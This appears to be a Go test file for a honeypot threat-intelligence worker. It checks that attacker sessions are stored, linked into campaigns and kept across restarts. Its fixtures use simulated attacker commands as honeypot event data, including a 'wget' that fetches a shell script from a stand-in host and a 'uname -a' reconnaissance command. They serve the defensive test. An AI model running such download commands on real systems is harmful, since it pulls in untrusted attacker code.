package intelligence

import (
	"context"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/database"
)

// sessionDB keeps the last version of every TTP session written to it.
type sessionDB struct {
	fakeDB
	mu      sync.Mutex
	written map[string]database.TTPSession
	writes  int
}

func (s *sessionDB) ReplaceIntelligenceSessions(ctx context.Context, revision uint64, rows []*database.TTPSession) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.written == nil {
		s.written = map[string]database.TTPSession{}
	}
	for _, sess := range rows {
		s.written[sess.SessionID] = *sess
		s.writes++
	}
	return s.fakeDB.ReplaceIntelligenceSessions(ctx, revision, rows)
}

func (s *sessionDB) snapshot() (map[string]database.TTPSession, int) {
	s.mu.Lock()
	defer s.mu.Unlock()
	out := make(map[string]database.TTPSession, len(s.written))
	for k, v := range s.written {
		out[k] = v
	}
	return out, s.writes
}

// TestWorkerPersistsLinkedSessions: when a later source shows evidence an
// earlier one showed, the earlier session's stored row must change too (its
// confidence, and its campaign fingerprint when two campaigns turn out to be
// one), although the batch holds none of its events. Session IDs never change,
// so every write updates the row it wrote before.
func TestWorkerPersistsLinkedSessions(t *testing.T) {
	db := &sessionDB{}
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	w := NewWorker(NewClassifier(loader, NewTTPBuilder(time.Hour)), db, time.Hour, 100)
	batch := func(events ...*database.Event) map[string]database.TTPSession {
		t.Helper()
		db.events = events
		w.drain(context.Background())
		if err := w.LastError(); err != nil {
			t.Fatal(err)
		}
		written, _ := db.snapshot()
		byIP := map[string]database.TTPSession{}
		for _, s := range written {
			if len(s.SourceIPs) != 1 || byIP[s.SourceIPs[0]].SessionID != "" {
				t.Fatalf("stored session %+v: want exactly one row per source", s)
			}
			byIP[s.SourceIPs[0]] = s
		}
		return byIP
	}
	command := func(ip, cmd string) *database.Event {
		return &database.Event{Honeypot: "cowrie", EventType: "command", SourceIP: ip, Command: cmd, Timestamp: time.Now().UTC()}
	}
	payload := strings.Repeat("ab", 32)

	first := batch(command("203.0.113.1", "wget http://198.51.100.9/a.sh"))["203.0.113.1"]
	if first.Confidence != confidenceSingleSource {
		t.Fatalf("one source alone stored with confidence %v", first.Confidence)
	}
	third := batch(downloadEvent("203.0.113.3", payload))["203.0.113.3"]
	if third.CampaignFingerprint == first.CampaignFingerprint {
		t.Fatal("unrelated sources stored in one campaign")
	}

	// The second source links the two: neither of their events is in its batch.
	rows := batch(command("203.0.113.2", "wget http://198.51.100.9/a.sh"), downloadEvent("203.0.113.2", payload))
	if len(rows) != 3 {
		t.Fatalf("%d stored sessions, want one per source", len(rows))
	}
	for ip, was := range map[string]database.TTPSession{"203.0.113.1": first, "203.0.113.3": third} {
		now := rows[ip]
		if now.SessionID != was.SessionID {
			t.Fatalf("%s: session ID changed from %q to %q", ip, was.SessionID, now.SessionID)
		}
		if now.CampaignFingerprint != rows["203.0.113.2"].CampaignFingerprint {
			t.Fatalf("%s: stored campaign %s, the linking source's is %s", ip, now.CampaignFingerprint, rows["203.0.113.2"].CampaignFingerprint)
		}
		if now.Confidence <= was.Confidence || now.EventCount != 1 {
			t.Fatalf("%s: stored confidence %v (was %v), %d events", ip, now.Confidence, was.Confidence, now.EventCount)
		}
	}
	if rows["203.0.113.3"].CampaignFingerprint == third.CampaignFingerprint {
		t.Fatal("the later campaign kept its own fingerprint after the two were linked")
	}

	// A restart recovers the same links from the checkpoint.
	w = NewWorker(NewClassifier(loader, NewTTPBuilder(time.Hour)), db, time.Hour, 100)
	rows = batch(command("203.0.113.4", "uname -a"))
	if len(rows) != 4 || rows["203.0.113.1"].CampaignFingerprint != rows["203.0.113.3"].CampaignFingerprint ||
		rows["203.0.113.4"].CampaignFingerprint == rows["203.0.113.1"].CampaignFingerprint {
		t.Fatalf("after a restart: %+v", rows)
	}
}

// TestWorkerPersistsCampaignInProgress: a TTP session was written only once it
// had been quiet for the whole inactivity window, or when the worker stopped
// cleanly. A campaign that never pauses that long (a botnet coming back every
// few minutes) was never in the database while it lasted: /api/ttps did not
// list it, and a crash or a kill lost it for good.
func TestWorkerPersistsCampaignInProgress(t *testing.T) {
	db := &sessionDB{}
	loader := NewATTCKLoader(t.TempDir())
	loader.loadEmbedded()
	const window = time.Second
	w := NewWorker(NewClassifier(loader, NewTTPBuilder(window)), db, time.Hour, 100)

	// One campaign for more than its inactivity window, an event every 100ms
	// as the worker passes: the session never goes quiet for a whole window.
	start := time.Now()
	for i := 0; time.Since(start) < 2*window; i++ {
		db.events = []*database.Event{wgetEvent(time.Now().UTC())}
		w.drain(context.Background())

		written, _ := db.snapshot()
		if len(written) != 1 {
			t.Fatalf("after %d events of one campaign: %d sessions in the database, want 1", i+1, len(written))
		}
		for _, s := range written {
			if s.EventCount != int64(i+1) {
				t.Fatalf("after %d events: the stored session has %d", i+1, s.EventCount)
			}
		}
		time.Sleep(window / 10)
	}
	if n := len(w.classifier.ttpBuilder.GetActiveSessions()); n != 1 {
		t.Fatalf("%d sessions in progress, want the one campaign still open", n)
	}

	// A pass with no new events writes nothing again.
	_, before := db.snapshot()
	db.events = nil
	w.drain(context.Background())
	if _, after := db.snapshot(); after != before {
		t.Fatalf("an unchanged session was written again (%d writes, then %d)", before, after)
	}
}
